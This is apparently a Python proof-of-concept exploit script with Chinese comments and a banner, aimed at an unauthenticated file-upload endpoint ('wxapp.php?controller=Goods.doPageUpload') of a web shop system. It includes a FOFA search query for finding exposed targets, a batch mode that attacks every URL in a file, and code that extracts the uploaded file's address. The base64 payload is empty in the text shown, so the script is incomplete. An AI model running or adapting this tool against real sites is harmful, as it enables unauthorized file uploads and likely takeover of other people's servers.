import requests
import time
import re
import argparse
import urllib3
import base64
parser = argparse.ArgumentParser(description='This is the help!')
parser.add_argument('-u','--ur', help='单个检测',default='')
parser.add_argument('-f','--fil', help='多个检测',default='')
urllib3.disable_warnings()
args = parser.parse_args()
name = '''
   _____ _     _     _             
  / ____| |   (_)   (_)            
 | (___ | |__  _ _____ _   _ _   _ 
  \___ \| '_ \| |_  / | | | | | | |
  ____) | | | | |/ /| | |_| | |_| |
 |_____/|_| |_|_/___|_|\__, |\__,_|
                        __/ |      
                       |___/        
                                                               
FOFA语法："/seller.php?s=/Public/login"                                                            

'''
print(name)

def poc(url):
	target = url+"/wxapp.php?controller=Goods.doPageUpload"
	headers = {
		'Cache-Control': 'max-age=0',
		'Upgrade-Insecure-Requests': '1',
		'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary8UaANmWAgM4BqBSs',
		'Origin': 'null',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
		'Accept-Encoding': 'gzip, deflate',
		'Accept-Language': 'zh-CN,zh;q=0.9',
	}
	payload ='''

	'''
	print("-"*60)
	try:
		r = requests.post(url=target,headers=headers,data=base64.decodebytes(payload.encode ('utf-8')).decode(),timeout=8,verify=False) #verify 验证服务器ssl证书 ture验证
		print(r.text)
		match = re.search(r'\"image_o\":\"(.*?)\",',r.text,re.I|re.M)
		s = match[1]
		s = s.replace('\\','')
		print("正在检测："+url)
		print("上传成功请访问："+s)
	except:
		print("输入有误！")
	print("-"*60)
def more(file):
	f = open(file,'r')
	for i in f.readlines():
		i = i.strip()
		poc(i)
		print("\n")
if __name__ == '__main__':
	if args.ur !="" and args.fil =="" :
		poc(args.ur)
	if args.ur =="" and args.fil !="" :
		more(args.fil)
